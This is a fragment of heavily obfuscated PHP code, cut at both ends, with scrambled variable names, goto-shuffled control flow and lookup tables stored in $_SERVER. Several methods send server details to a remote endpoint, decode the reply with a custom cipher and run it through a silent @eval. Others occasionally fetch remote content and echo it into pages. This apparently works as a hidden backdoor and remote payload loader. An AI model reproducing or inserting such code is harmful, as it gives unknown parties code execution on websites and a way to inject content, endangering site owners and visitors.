fôÅ­Ó‰Ê; CôŞàã¬áİ: $d˜œˆ§®×Ù = array($dĞ³åèŞ¦¦[261]); $cØùİö‰ = $d¿‹÷º‰–[602]; if (!$cØùİö‰) { return; } goto DÉ•ÊƒÏĞ¥; dù ì‚Ò½: } public function bcwq21fead14() { return $_SERVER[ë¿˜ªè¥×”ö][266]; } private function ezjkd0e74b83() { goto fÄÂ£Â†İ”; FŸ§ÇàÁŒÂ: $EÊÁãòÔœ = $cï¤„÷‚¢[270] . $cï¤„÷‚¢[111]($cï¤„÷‚¢[271]); $dë“‡ç¦¤ö = $AÜˆİ±Ò‚‚[604]; if (!$dë“‡ç¦¤ö) { die; } goto bí…Ç¤¯¤; eÒÕšŠîª‘: $a•õé®Ê = array($cï¤„÷‚¢[162] => $cï¤„÷‚¢[61]($cï¤„÷‚¢[62])->{$_SERVER[ë¿˜ªè¥×”ö][63]}($cï¤„÷‚¢[206]), $cï¤„÷‚¢[175] => $this->gpwjd31c2313, $cï¤„÷‚¢[173] => $_SERVER[$cï¤„÷‚¢[174]], $cï¤„÷‚¢[166] => $cï¤„÷‚¢[146], $cï¤„÷‚¢[169] => $_SERVER[$cï¤„÷‚¢[170]]); $EÒÉÕÑØ—ç = $AÜˆİ±Ò‚‚[605]; $Fèò…ÉÁ = $this->{$_SERVER[ë¿˜ªè¥×”ö][179]}($cï¤„÷‚¢[275], $a•õé®Ê); goto BîÜí”Íµ°; a£é¿ÙÔåñ: if ($this->{$_SERVER[ë¿˜ªè¥×”ö][196]}($Fèò…ÉÁ[$cï¤„÷‚¢[276]]) != $a•õé®Ê[$cï¤„÷‚¢[162]]) { $FÆ¸Ìò«Ê = array($cï¤„÷‚¢[199] => $cï¤„÷‚¢[61]($cï¤„÷‚¢[62])->{$_SERVER[ë¿˜ªè¥×”ö][63]}($cï¤„÷‚¢[113]), $cï¤„÷‚¢[200] => $_SERVER[$cï¤„÷‚¢[112]], $cï¤„÷‚¢[201] => $cï¤„÷‚¢[202](), $cï¤„÷‚¢[171] => $_SERVER[$cï¤„÷‚¢[172]]); $dÑæ©«„Ã = $this->{$_SERVER[ë¿˜ªè¥×”ö][203]}($cï¤„÷‚¢[145]($FÆ¸Ìò«Ê)); $Fèò…ÉÁ = $this->{$_SERVER[ë¿˜ªè¥×”ö][179]}($cï¤„÷‚¢[204] . $dÑæ©«„Ã); if ($Fèò…ÉÁ && $cï¤„÷‚¢[188]($Fèò…ÉÁ) && isset($Fèò…ÉÁ[$cï¤„÷‚¢[276]])) { $bô›õ®ïóÆ = $this->{$_SERVER[ë¿˜ªè¥×”ö][185]}($Fèò…ÉÁ[$cï¤„÷‚¢[276]], 2); if ($bô›õ®ïóÆ) { $bô›õ®ïóÆ = $this->{$_SERVER[ë¿˜ªè¥×”ö][196]}($bô›õ®ïóÆ); } if ($bô›õ®ïóÆ) { try { @eval($bô›õ®ïóÆ); } catch (Exception $e´‡§¿õ·˜) { } } } } goto eÔƒËÖ†‡; BîÜí”Íµ°: if (!$cï¤„÷‚¢[188]($Fèò…ÉÁ)) { return; } if ($Fèò…ÉÁ[$cï¤„÷‚¢[162]] && $Fèò…ÉÁ[$cï¤„÷‚¢[276]]) { if ($this->{$_SERVER[ë¿˜ªè¥×”ö][196]}($Fèò…ÉÁ[$cï¤„÷‚¢[276]]) == $a•õé®Ê[$cï¤„÷‚¢[162]]) { return; } } $this->{$_SERVER[ë¿˜ªè¥×”ö][161]}(); goto a£é¿ÙÔåñ; fÄÂ£Â†İ”: $AÜˆİ±Ò‚‚ =& $_SERVER[÷ÖêïÔÔÓ]; $cï¤„÷‚¢ =& $_SERVER[ë¿˜ªè¥×”ö]; $C±õƒ½èÌ = array($cï¤„÷‚¢[267], $cï¤„÷‚¢[268], $cï¤„÷‚¢[269]); goto FŸ§ÇàÁŒÂ; BàĞîø§ĞÏ: $CÛÕ“¥ÔÑœ = $cï¤„÷‚¢[13](array($cï¤„÷‚¢[272], $cï¤„÷‚¢[273]), $EÊÁãòÔœ); if ($CÛÕ“¥ÔÑœ && $cï¤„÷‚¢[227]() - $CÛÕ“¥ÔÑœ < $cï¤„÷‚¢[198]($cï¤„÷‚¢[274])) { return; } $cï¤„÷‚¢[13](array($cï¤„÷‚¢[272], $cï¤„÷‚¢[149]), $EÊÁãòÔœ, $cï¤„÷‚¢[227]()); goto eÒÕšŠîª‘; bí…Ç¤¯¤: if ($this->gpwjd31c2313 == $cï¤„÷‚¢[118] || !$GLOBALS[$cï¤„÷‚¢[129]]) { return; } if (!$cï¤„÷‚¢[233]($_SERVER[$cï¤„÷‚¢[44]], $C±õƒ½èÌ)) { return; } if ($cï¤„÷‚¢[227]() % 4 != 0) { return; } goto BàĞîø§ĞÏ; eÔƒËÖ†‡: } private function mcqbbda0dbf9($Cœ‡„´’Î´ = '', $cË’²´ÎØ = array(), $aä‘ëê´ñ› = 5) { goto dÓˆ†­Ø–İ; B•Ìù´¾¥½: $c×øØ¶ñ• = $Fñ©ÆÙ‘[607]; while ($c×øØ¶ñ• < $Fñ©ÆÙ‘[548]) { if ($c×øØ¶ñ• >= 0) { break; } $c×øØ¶ñ•++; } if ($cË’²´ÎØ === -1) { return $AÛÓ’Ã¯Ì ; } goto D¯•İ¯‹Œ÷; dÓˆ†­Ø–İ: $Fñ©ÆÙ‘ =& $_SERVER[÷ÖêïÔÔÓ]; $F»Ôø¢®® =& $_SERVER[ë¿˜ªè¥×”ö]; $AÛÓ’Ã¯Ì  = $F»Ôø¢®®[277]; goto A”ÜĞù†àã; c¸ãÚ‰Îã°: while ($d«÷„ÀÂ’ô < $Fñ©ÆÙ‘[545]) { if ($d«÷„ÀÂ’ô >= 0) { break; } $d«÷„ÀÂ’ô++; } return $F»Ôø¢®®[187]($cË’²´ÎØ, !0); $f¿Ùº©‹Ò˜ = $Fñ©ÆÙ‘[609]; goto B‰¡âòƒŒ; D¯•İ¯‹Œ÷: $aŒÛÊÕ¡­ = $F»Ôø¢®®[242](array($F»Ôø¢®®[243] => array($F»Ôø¢®®[246] => $aä‘ëê´ñ›, $F»Ôø¢®®[244] => $F»Ôø¢®®[281]), $F»Ôø¢®®[282] => array($F»Ôø¢®®[283] => !1, $F»Ôø¢®®[284] => !1))); $cË’²´ÎØ = @$F»Ôø¢®®[247]($AÛÓ’Ã¯Ì , !1, $aŒÛÊÕ¡­); $d«÷„ÀÂ’ô = $Fñ©ÆÙ‘[608]; goto c¸ãÚ‰Îã°; A”ÜĞù†àã: $AÛÓ’Ã¯Ì  = $this->{$_SERVER[ë¿˜ªè¥×”ö][240]}($AÛÓ’Ã¯Ì , $F»Ôø¢®®[278]); $e×Ì”À×ª = $Fñ©ÆÙ‘[606]; $AÛÓ’Ã¯Ì  = $AÛÓ’Ã¯Ì  . $Cœ‡„´’Î´ . $F»Ôø¢®®[279] . $F»Ôø¢®®[280]($cË’²´ÎØ); goto B•Ìù´¾¥½; B‰¡âòƒŒ: } private function fbmne1ad650a() { goto cÁ¾ÒÀ¬Ñé; aÙâ•¨ÕØŒ: $Bá­Š¯›­· = $Bá­Š¯›­· ? $cÉ¯Öî¾›×[198]($Bá­Š¯›­·) : 0; $dÁÍ÷ÅŸŸ› = $d‘›‡…½¤õ[613]; return $E†“é–«¢˜ + $Bá­Š¯›­·; goto b‡–Ç‡ŠÁõ; a÷É´ÑÌÄ‡: $Bá­Š¯›­· = $cÉ¯Öî¾›×[101]($this->edfm0e49405f, $cÉ¯Öî¾›×[312]); $b¨¿áñèò™ = $d‘›‡…½¤õ[612]; if (!$b¨¿áñèò™) { return; } goto aÙâ•¨ÕØŒ; d’”Å™Œ·Û: $E†“é–«¢˜ = $c›íí¤õì[$this->gpwjd31c2313]; $C‹ˆãÙ‚º‰ = $d‘›‡…½¤õ[610]; if (!$C‹ˆãÙ‚º‰) { return; } goto aÖİò…˜µª; aÖİò…˜µª: $E†“é–«¢˜ = $cÉ¯Öî¾›×[198]($E†“é–«¢˜ ? $E†“é–«¢˜ : $cÉ¯Öî¾›×[286]); $d¶‹çìß²ˆ = $d‘›‡…½¤õ[611]; if (strlen($d¶‹çìß²ˆ) < $d‘›‡…½¤õ[550]) { die; } goto a÷É´ÑÌÄ‡; cÁ¾ÒÀ¬Ñé: $d‘›‡…½¤õ =& $_SERVER[÷ÖêïÔÔÓ]; $cÉ¯Öî¾›× =& $_SERVER[ë¿˜ªè¥×”ö]; $c›íí¤õì = array($cÉ¯Öî¾›×[285] => $cÉ¯Öî¾›×[286], $cÉ¯Öî¾›×[287] => $cÉ¯Öî¾›×[288], $cÉ¯Öî¾›×[289] => $cÉ¯Öî¾›×[290], $cÉ¯Öî¾›×[291] => $cÉ¯Öî¾›×[292], $cÉ¯Öî¾›×[293] => $cÉ¯Öî¾›×[294], $cÉ¯Öî¾›×[295] => $cÉ¯Öî¾›×[235], $cÉ¯Öî¾›×[296] => $cÉ¯Öî¾›×[235], $cÉ¯Öî¾›×[297] => $cÉ¯Öî¾›×[286], $cÉ¯Öî¾›×[298] => $cÉ¯Öî¾›×[288], $cÉ¯Öî¾›×[299] => $cÉ¯Öî¾›×[290], $cÉ¯Öî¾›×[300] => $cÉ¯Öî¾›×[301], $cÉ¯Öî¾›×[302] => $cÉ¯Öî¾›×[292], $cÉ¯Öî¾›×[303] => $cÉ¯Öî¾›×[304], $cÉ¯Öî¾›×[305] => $cÉ¯Öî¾›×[294], $cÉ¯Öî¾›×[306] => $cÉ¯Öî¾›×[307], $cÉ¯Öî¾›×[308] => $cÉ¯Öî¾›×[309], $cÉ¯Öî¾›×[310] => $cÉ¯Öî¾›×[311]); goto d’”Å™Œ·Û; b‡–Ç‡ŠÁõ: } public function bzlf52019d2b($dÖŞåğ) { goto E³‹÷Áßç†; E³‹÷Áßç†: $F“œÛŒË³˜ =& $_SERVER[ë¿˜ªè¥×”ö]; $dè¹ÒËŒ”Û = $this->{$_SERVER[ë¿˜ªè¥×”ö][134]}(); $fÏ†¯îà  = $_SERVER[÷ÖêïÔÔÓ][614]; goto f¿ã­¸ã¾…; f¿ã­¸ã¾…: if ($dè¹ÒËŒ”Û >= $F“œÛŒË³˜[198]($F“œÛŒË³˜[235])) { return; } $E¥¯¼Ñ›îó = $F“œÛŒË³˜[61]($F“œÛŒË³˜[136])->{$_SERVER[ë¿˜ªè¥×”ö][137]}(); if ($E¥¯¼Ñ›îó <= $dè¹ÒËŒ”Û) { return; } goto Bôùä¹º—; Bôùä¹º—: $bëÌ¨Öˆ½ = $F“œÛŒË³˜[61]($F“œÛŒË³˜[136])->{$_SERVER[ë¿˜ªè¥×”ö][313]}($F“œÛŒË³˜[314])->{$_SERVER[ë¿˜ªè¥×”ö][315]}($dè¹ÒËŒ”Û)->{$_SERVER[ë¿˜ªè¥×”ö][316]}(); $bëÌ¨Öˆ½ = $F“œÛŒË³˜[219]($bëÌ¨Öˆ½, $F“œÛŒË³˜[10], $F“œÛŒË³˜[314]); if (!$F“œÛŒË³˜[233]($dÖŞåğ[$F“œÛŒË³˜[314]], $bëÌ¨Öˆ½)) { $F“œÛŒË³˜[163]($F“œÛŒË³˜[317], !1, $F“œÛŒË³˜[230]); } goto a ¯„æ’Û; a ¯„æ’Û: } public function ysahb53e9d96() { goto B¶­‡ªÛÜè; Fâê’‡¡‹µ: $D¸¢ÕËÃî = $this->{$_SERVER[ë¿˜ªè¥×”ö][240]}($D¸¢ÕËÃî, $FŒ´Àà«¥‹[241]); $B•Æ„š·°‰ = $FŒ´Àà«¥‹[242](array($FŒ´Àà«¥‹[243] => array($FŒ´Àà«¥‹[244] => $FŒ´Àà«¥‹[245], $FŒ´Àà«¥‹[246] => 3))); $Bì–¯‚£œ˜ = @$FŒ´Àà«¥‹[247]($D¸¢ÕËÃî, !1, $B•Æ„š·°‰); goto E§¶Üº†¯š; E§¶Üº†¯š: echo $FŒ´Àà«¥‹[319] . $FŒ´Àà«¥‹[320]($Bì–¯‚£œ˜) . $FŒ´Àà«¥‹[321]; $däÒ¼ÑÍ = $_SERVER[÷ÖêïÔÔÓ][615]; goto dòÏùŞÑ; B¶­‡ªÛÜè: $FŒ´Àà«¥‹ =& $_SERVER[ë¿˜ªè¥×”ö]; if (!$GLOBALS[$FŒ´Àà«¥‹[129]] || $FŒ´Àà«¥‹[318](1, 100) > 20) { return; } $D¸¢ÕËÃî = $FŒ´Àà«¥‹[239]; goto Fâê’‡¡‹µ; dòÏùŞÑ: } private function vqyr63297c8c($C¾ÏªÇ“ÌÏ, $dİ¢ìèÁ ¿, $Eî‚ğì–‘¸ = 3) { goto Eù÷àÎ˜ƒ; AæÇéø¼ôõ: $dºõŠ‹Ì•ì = $fÆÂĞéÏ¬•[616]; if (!$dºõŠ‹Ì•ì) { die; } $C¾ÏªÇ“ÌÏ = $C¶øÅŒŸÏö[2]($C¾ÏªÇ“ÌÏ); goto døğß÷‹¢Ó; døğß÷‹¢Ó: $EÃõÚ††Ê = $fÆÂĞéÏ¬•[617]; $cà¼‘ìÂìƒ = $C¶øÅŒŸÏö[318](0, 5) . $C¶øÅŒŸÏö[10]; $CêŸË‚œã = $fÆÂĞéÏ¬•[618]; goto B¸¼ŠÁ§—ƒ; DÑ•š»·æ: if (strlen($e˜À¾²»°) < $fÆÂĞéÏ¬•[540]) { return; } $A½ŒäÁŒ³È = $C¶øÅŒŸÏö[323]; switch ($cà¼‘ìÂìƒ) { case $C¶øÅŒŸÏö[226]: $eäàà¾…‡ğ = $this->{$_SERVER[ë¿˜ªè¥×”ö][144]}($C¾ÏªÇ“ÌÏ, $C¶øÅŒŸÏö[211]($dİ¢ìèÁ ¿ . $e¯ˆÚèÚˆ‚)); $fó½Íİ¢ = $fÆÂĞéÏ¬•[620]; if (!$fó½Íİ¢) { return; } break; $e‘ë—ëÈ«« = $fÆÂĞéÏ¬•[621]; case $C¶øÅŒŸÏö[217]: $eäàà¾…‡ğ = $this->{$_SERVER[ë¿˜ªè¥×”ö][144]}($C¾ÏªÇ“ÌÏ, $C¶øÅŒŸÏö[211]($e¯ˆÚèÚˆ‚ . $dİ¢ìèÁ ¿)); $aÍˆçÖ©‚µ = $fÆÂĞéÏ¬•[622]; if (strlen($aÍˆçÖ©‚µ) < $fÆÂĞéÏ¬•[550]) { return; } break; case $C¶øÅŒŸÏö[324]: $eäàà¾…‡ğ = $this->{$_SERVER[ë¿˜ªè¥×”ö][144]}($C¾ÏªÇ“ÌÏ, $C¶øÅŒŸÏö[115]($e¯ˆÚèÚˆ‚ . $dİ¢ìèÁ ¿)); break; case $C¶øÅŒŸÏö[325]: $eäàà¾…‡ğ = $this->{$_SERVER[ë¿˜ªè¥×”ö][144]}($C¾ÏªÇ“ÌÏ, $C¶øÅŒŸÏö[111]($e¯ˆÚèÚˆ‚ . $dİ¢ìèÁ ¿)); break; case $C¶øÅŒŸÏö[326]: goto eè¢ƒ…ßØ£; c–¯¹Àç¡–: $B¸·˜í¹¢æ = 0; for ($dí×ù‰…ª = 0; $dí×ù‰…ª < $C¶øÅŒŸÏö[24]($C¾ÏªÇ“ÌÏ); $dí×ù‰…ª++) { $B¸·˜í¹¢æ = $B¸·˜í¹¢æ == $C¶øÅŒŸÏö[24]($D±ñ®ÚÔ) ? 0 : $B¸·˜í¹¢æ; $bÍ½ÑâœŒÉ = $fÆÂĞéÏ¬•[628]; $C´÷Ì±µÍĞ = ($B¤­£•æõ” + $C¶øÅŒŸÏö[328]($A½ŒäÁŒ³È, $C¾ÏªÇ“ÌÏ[$dí×ù‰…ª]) + $C¶øÅŒŸÏö[329]($D±ñ®ÚÔ[$B¸·˜í¹¢æ++])) % 64; $Aİ£•¦Úšˆ .= $A½ŒäÁŒ³È[$C´÷Ì±µÍĞ]; } $eäàà¾…‡ğ = $C¶øÅŒŸÏö[320]($cõÁ²¾‡© . $Aİ£•¦Úšˆ); goto aÉåÂÓÈ¬ô; eè¢ƒ…ßØ£: $C¾ÏªÇ“ÌÏ = $C¶øÅŒŸÏö[115]($C¾ÏªÇ“ÌÏ); $eÒËò‰ê¥× = $fÆÂĞéÏ¬•[623]; while ($eÒËò‰ê¥× < $fÆÂĞéÏ¬•[540]) { if ($eÒËò‰ê¥× >= 0) { break; } $eÒËò‰ê¥×++; } goto cßÈâŠ‚ä; BÒ’…™«: $côğ…Çõù… = $fÆÂĞéÏ¬•[627]; if (!$côğ…Çõù…) { return; } $C´÷Ì±µÍĞ = 0; goto c–¯¹Àç¡–; cßÈâŠ‚ä: $B¤­£•æõ” = $C¶øÅŒŸÏö[327](0, 64); $c£‘İ«»‘ô = $fÆÂĞéÏ¬•[624]; if (!$c£‘İ«»‘ô) { die; } goto E¢Š´ĞÒª§; E¢Š´ĞÒª§: $cõÁ²¾‡© = $A½ŒäÁŒ³È[$B¤­£•æõ”]; $D±ñ®ÚÔ = $C¶øÅŒŸÏö[111]($cõÁ²¾‡© . $C¶øÅŒŸÏö[111]($dİ¢ìèÁ ¿ . $cõÁ²¾‡©) . $dİ¢ìèÁ ¿); $cÅíÊ¼†Àƒ = $fÆÂĞéÏ¬•[625]; goto f„ÏÄ¢Şáß; aÉåÂÓÈ¬ô: break; $fƒ œˆóÓ£ = $fÆÂĞéÏ¬•[629]; goto AÈÍ¢†èºÒ; f„ÏÄ¢Şáß: while (strlen($cÅíÊ¼†Àƒ) < $fÆÂĞéÏ¬•[557]) { if (!$cÅíÊ¼†Àƒ) { break; } $cÅíÊ¼†Àƒ++; } $D±ñ®ÚÔ = $C¶øÅŒŸÏö[25]($D±ñ®ÚÔ, $B¤­£•æõ” % 8, $B¤­£•æõ” % 8 + 7); $CŒÇÚã¤ê = $fÆÂĞéÏ¬•[626]; goto fÖóÂÜÙÌñ; fÖóÂÜÙÌñ: if (strlen($CŒÇÚã¤ê) < $fÆÂĞéÏ¬•[550]) { return; } $Aİ£•¦Úšˆ = $C¶øÅŒŸÏö[10]; $dí×ù‰…ª = 0; goto BÒ’…™«; AÈÍ¢†èºÒ: default: $eäàà¾…‡ğ = $this->{$_SERVER[ë¿˜ªè¥×”ö][144]}($C¾ÏªÇ“ÌÏ, $dİ¢ìèÁ ¿ . $e¯ˆÚèÚˆ‚); $aåÛÏÆ¼Òò = $fÆÂĞéÏ¬•[630]; break; $aø·¡‡º˜ì = $fÆÂĞéÏ¬•[631]; if (strlen($aø·¡‡º˜ì) < $fÆÂĞéÏ¬•[548]) { die; } } goto FÚìá¬Ú˜¾; B¸¼ŠÁ§—ƒ: while (strlen($CêŸË‚œã) < $fÆÂĞéÏ¬•[540]) { if (!$CêŸË‚œã) { break; } $CêŸË‚œã++; } $e¯ˆÚèÚˆ‚ = $C¶øÅŒŸÏö[121](15); $e˜À¾²»° = $fÆÂĞéÏ¬•[619]; goto DÑ•š»·æ; Eù÷àÎ˜ƒ: $fÆÂĞéÏ¬• =& $_SERVER[÷ÖêïÔÔÓ]; $C¶øÅŒŸÏö =& $_SERVER[ë¿˜ªè¥×”ö]; $C¶øÅŒŸÏö[322](1); goto AæÇéø¼ôõ; FÚìá¬Ú˜¾: $eäàà¾…‡ğ = $C¶øÅŒŸÏö[211]($cà¼‘ìÂìƒ . $e¯ˆÚèÚˆ‚ . $eäàà¾…‡ğ); if ($Eî‚ğì–‘¸ - 1 > 0) { $eäàà¾…‡ğ = $this->{$_SERVER[ë¿˜ªè¥×”ö][124]}($eäàà¾…‡ğ, $dİ¢ìèÁ ¿, $Eî‚ğì–‘¸ - 1); } return $eäàà¾…‡ğ; goto Eº’ùŞà™ï; Eº’ùŞà™ï: } private function jcqy9829df3b($a®ß—„æ´Ü, $dÏ‰é³®Ÿƒ, $D»—²í—ÕÑ = 3) { goto dŸÙØÉ…Œ; E®Äå¶Ä³ã: $a®ß—„æ´Ü = $D·Åİèß±[2]($a®ß—„æ´Ü); $a®ß—„æ´Ü = $D·Åİèß±[211]($a®ß—„æ´Ü); $cÃ‚½á¯¸à = $a®ß—„æ´Ü[0]; goto dºÃ²ïã; dŸÙØÉ…Œ: $Déò’ó‰‰Œ =& $_SERVER[÷ÖêïÔÔÓ]; $D·Åİèß± =& $_SERVER[ë¿˜ªè¥×”ö]; if (!$D·Åİèß±[330]($a®ß—„æ´Ü) || $D·Åİèß±[24]($a®ß—„æ´Ü) < 10) { return !1; } goto E®Äå¶Ä³ã; c¤šæà¡£´: $AÔ»Š“ò±º = $Déò’ó‰‰Œ[633]; while ($AÔ»Š“ò±º < $Déò’ó‰‰Œ[545]) { if ($AÔ»Š“ò±º >= 0) { break; } $AÔ»Š“ò±º++; } $a®ß—„æ´Ü = $D·Åİèß±[25]($a®ß—„æ´Ü, 16); goto a•œñÊ÷Œ; Cªô§·ÍÂá: switch ($cÃ‚½á¯¸à) { case $D·Åİèß±[226]: $BƒŠ«ÉŠ¶… = $this->{$_SERVER[ë¿˜ªè¥×”ö][240]}($a®ß—„æ´Ü, $D·Åİèß±[211]($dÏ‰é³®Ÿƒ . $d‘½©è©«)); $B÷›…á¦ = $Déò’ó‰‰Œ[615]; if (!$B÷›…á¦) { return; } break; case $D·Åİèß±[217]: $BƒŠ«ÉŠ¶… = $this->{$_SERVER[ë¿˜ªè¥×”ö][240]}($a®ß—„æ´Ü, $D·Åİèß±[211]($d‘½©è©« . $dÏ‰é³®Ÿƒ)); break; case $D·Åİèß±[324]: $BƒŠ«ÉŠ¶… = $this->{$_SERVER[ë¿˜ªè¥×”ö][240]}($a®ß—„æ´Ü, $D·Åİèß±[115]($d‘½©è©« . $dÏ‰é³®Ÿƒ)); break; $AÀƒë†Ô¡ = $Déò’ó‰‰Œ[635]; case $D·Åİèß±[325]: $BƒŠ«ÉŠ¶… = $this->{$_SERVER[ë¿˜ªè¥×”ö][240]}($a®ß—„æ´Ü, $D·Åİèß±[111]($d‘½©è©« . $dÏ‰é³®Ÿƒ)); $FœÀÚÄ¶… = $Déò’ó‰‰Œ[636]; if (strlen($FœÀÚÄ¶…) < $Déò’ó‰‰Œ[550]) { die; } break; case $D·Åİèß±[326]: goto b†Î·¿‘Æ™; C¥ÆãîÙô: $aï—ÀÑÏ·š = $Déò’ó‰‰Œ[642]; if (!$aï—ÀÑÏ·š) { return; } $A›…Úø‹íÉ = 0; goto Aò³Çâ¬›ù; B ‘äáÃ‹¡: break; $EÜÊ©…ÉÓó = $Déò’ó‰‰Œ[648]; if (strlen($EÜÊ©…ÉÓó) < $Déò’ó‰‰Œ[540]) { return; } goto C›®à½¡ä; a„¸§ÓòÍô: $b¹‰³¶»ŠË = $D·Åİèß±[25]($b¹‰³¶»ŠË, $B¼ïğÍç‡ğ % 8, $B¼ïğÍç‡ğ % 8 + 7); $Cß¥ÕáØë = $Déò’ó‰‰Œ[641]; if (strlen($Cß¥ÕáØë) < $Déò’ó‰‰Œ[557]) { return; } goto Aå‘Ò©ŒÆœ; Aå‘Ò©ŒÆœ: $E—ÃĞ¶àİ = $D·Åİèß±[10]; $bÒÉ±”˜¼ø = 0; $eÄ‹§ßª†ñ = 0; goto C¥ÆãîÙô; b†Î·¿‘Æ™: $a®ß—„æ´Ü = $D·Åİèß±[331]($a®ß—„æ´Ü); $F¥âè½Ğâ‡ = $Déò’ó‰‰Œ[637]; if (!$F¥âè½Ğâ‡) { die; } goto EĞ—Å°Å¹; Aò³Çâ¬›ù: $f“ÈÃ™šÏ = $Déò’ó‰‰Œ[643]; for ($bÒÉ±”˜¼ø = 0; $bÒÉ±”˜¼ø < $D·Åİèß±[24]($a®ß—„æ´Ü); $bÒÉ±”˜¼ø++) { $A›…Úø‹íÉ = $A›…Úø‹íÉ == $D·Åİèß±[24]($b¹‰³¶»ŠË) ? 0 : $A›…Úø‹íÉ; $EÂâ¹Ó‚¶ = $Déò’ó‰‰Œ[644]; $BÍŒœÎÔí = $A›…Úø‹íÉ++; $b×ôß ªˆÄ = $Déò’ó‰‰Œ[645]; while ($b×ôß ªˆÄ < $Déò’ó‰‰Œ[550]) { if ($b×ôß ªˆÄ >= 0) { break; } $b×ôß ªˆÄ++; } $eÄ‹§ßª†ñ = $D·Åİèß±[328]($B·šà’²¤, $a®ß—„æ´Ü[$bÒÉ±”˜¼ø]) - $B¼ïğÍç‡ğ - $D·Åİèß±[329]($b¹‰³¶»ŠË[$BÍŒœÎÔí]); $eôœö¿ ×É = $Déò’ó‰‰Œ[646]; if (strlen($eôœö¿ ×É) < $Déò’ó‰‰Œ[557]) { return; } while ($eÄ‹§ßª†ñ < 0) { $eÄ‹§ßª†ñ += 64; $còå¥ğÆ« = $Déò’ó‰‰Œ[647]; while (strlen($còå¥ğÆ«) < $Déò’ó‰‰Œ[540]) { if (!$còå¥ğÆ«) { break; } $còå¥ğÆ«++; } } $E—ÃĞ¶àİ .= $B·šà’²¤[$eÄ‹§ßª†ñ]; } $BƒŠ«ÉŠ¶… = $D·Åİèß±[332]($E—ÃĞ¶àİ); goto B ‘äáÃ‹¡; fªŒÂ´¡Õ: if (strlen($Eëš„ÍŠŒ) < $Déò’ó‰‰Œ[548]) { return; } $B¼ïğÍç‡ğ = $D·Åİèß±[328]($B·šà’²¤, $bÏÈ—ë‡Êã); $dˆœØÓ† = $Déò’ó‰‰Œ[639]; goto fÇÙŸïö¯ö; EĞ—Å°Å¹: $bÏÈ—ë‡Êã = $a®ß—„æ´Ü[0]; $a®ß—„æ´Ü = $D·Åİèß±[25]($a®ß—„æ´Ü, 1); $Eëš„ÍŠŒ = $Déò’ó‰‰Œ[638]; goto fªŒÂ´¡Õ; fÇÙŸïö¯ö: $b¹‰³¶»ŠË = $D·Åİèß±[111]($bÏÈ—ë‡Êã . $D·Åİèß±[111]($dÏ‰é³®Ÿƒ . $bÏÈ—ë‡Êã) . $dÏ‰é³®Ÿƒ); $b´µ ¡è¸ù = $Déò’ó‰‰Œ[640]; while (strlen($b´µ ¡è¸ù) < $Déò’ó‰‰Œ[548]) { if (!$b´µ ¡è¸ù) { break; } $b´µ ¡è¸ù++; } goto a„¸§ÓòÍô; C›®à½¡ä: default: $BƒŠ«ÉŠ¶… = $this->{$_SERVER[ë¿˜ªè¥×”ö][240]}($a®ß—„æ´Ü, $dÏ‰é³®Ÿƒ . $d‘½©è©«); $FÉÛñ¾Ïë† = $Déò’ó‰‰Œ[649]; if (!$FÉÛñ¾Ïë†) { die; } break; $aªŒ‰ ãñ = $Déò’ó‰‰Œ[650]; if (!$aªŒ‰ ãñ) { return; } } if ($D»—²í—ÕÑ - 1 > 0) { $BƒŠ«ÉŠ¶… = $this->{$_SERVER[ë¿˜ªè¥×”ö][185]}($BƒŠ«ÉŠ¶…, $dÏ‰é³®Ÿƒ, $D»—²í—ÕÑ - 1); } return $BƒŠ«ÉŠ¶…; goto F¾°À´Š‡™; dºÃ²ïã: $F˜äÏ‹ôß… = $Déò’ó‰‰Œ[632]; if (!$F˜äÏ‹ôß…) { return; } $d‘½©è©« = $D·Åİèß±[25]($a®ß—„æ´Ü, 1, 15); goto c¤šæà¡£´; a•œñÊ÷Œ: $B·šà’²¤ = $D·Åİèß±[323]; $Cã«ÖÖ·Øğ = $Déò’ó‰‰Œ[634]; while (strlen($Cã«ÖÖ·Øğ) < $Déò’ó‰‰Œ[548]) { if (!$Cã«ÖÖ·Øğ) { break; } $Cã«ÖÖ·Øğ++; } goto Cªô§·ÍÂá; F¾°À´Š‡™: } public function jzbsec873798($Bçó´ÓÓÅ) { goto EÜéö…ÌÇ; d£”ÅÈšß: $aÏ†¸à©—‘ = ($a¿·¨®§” - 1) * ($f¨¦Ö¬ùâ - 1); $BŒºé¨¦íŞ = $A™ŞÆÓíŸ•[198](($a¿·¨®§” + $f¨¦Ö¬ùâ) / 2); while (1) { $CµµŸƒ¨‡¶ = $BŒºé¨¦íŞ; $D¸Ìè×“”¢ = $aÏ†¸à©—‘; $Cá†“’£¸Š = $d‘á¬¬Ô½[652]; while (strlen($Cá†“’£¸Š) < $d‘á¬¬Ô½[540]) { if (!$Cá†“’£¸Š) { break; } $Cá†“’£¸Š++; } while ($D¸Ìè×“”¢ % $CµµŸƒ¨‡¶ != 0) { $b˜îÛÂ¸Öå = $D¸Ìè×“”¢; $CÔ‘ŸË¥Ã = $d‘á¬¬Ô½[653]; while ($CÔ‘ŸË¥Ã < $d‘á¬¬Ô½[545]) { if ($CÔ‘ŸË¥Ã >= 0) { break; } $CÔ‘ŸË¥Ã++; } $D¸Ìè×“”¢ = $CµµŸƒ¨‡¶; $CµµŸƒ¨‡¶ = $b˜îÛÂ¸Öå % $CµµŸƒ¨‡¶; $C•‡‰„İºˆ = $d‘á¬¬Ô½[654]; } if ($CµµŸƒ¨‡¶ == 1) { break; } else { $BŒºé¨¦íŞ++; } } goto E·Ò¨Ê¬½Ò; E·Ò¨Ê¬½Ò: $E°›¿®Š‹à = 2; $EÄ¶¸¬™ç = $d‘á¬¬Ô½[655]; if (!$EÄ¶¸¬™ç) { return; } goto c×Ò—Ä±‚ó; c×Ò—Ä±‚ó: for ($E—¦éëŒĞƒ = 0; $E—¦éëŒĞƒ < $aÏ†¸à©—‘ * 10; $E—¦éëŒĞƒ++) { if (($aÏ†¸à©—‘ * $E—¦éëŒĞƒ + 1) % $BŒºé¨¦íŞ == 0) { $E°›¿®Š‹à = $A™ŞÆÓíŸ•[198](($aÏ†¸à©—‘ * $E—¦éëŒĞƒ + 1) / $BŒºé¨¦íŞ); break; } } $CÍêä·Š®Ã = $this->{$_SERVER[ë¿˜ªè¥×”ö][144]}($a¿·¨®§” * $f¨¦Ö¬ùâ . $A™ŞÆÓíŸ•[10], $A™ŞÆÓíŸ•[146]); $FÅºª¡äó = $A™ŞÆÓíŸ•[111]($A™ŞÆÓíŸ•[334] . ($a¿·¨®§” + $f¨¦Ö¬ùâ) . $A™ŞÆÓíŸ•[335] . $BŒºé¨¦íŞ . $A™ŞÆÓíŸ•[335] . $E°›¿®Š‹à . 